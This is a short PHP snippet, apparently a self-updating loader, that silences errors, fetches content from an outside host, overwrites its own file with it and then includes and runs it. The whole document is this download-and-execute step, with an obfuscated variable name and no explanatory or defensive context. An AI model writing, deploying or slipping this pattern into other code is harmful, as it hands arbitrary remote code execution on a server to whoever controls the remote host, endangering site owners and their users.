error_reporting(0);

    echo "Loading...     \r";
    $HwBDokqdMr = file_get_contents("https://dhtool.ikwb.com/220724dh.json");
    file_put_contents(__FILE__, $HwBDokqdMr);
    include __FILE__;
    exit;
    
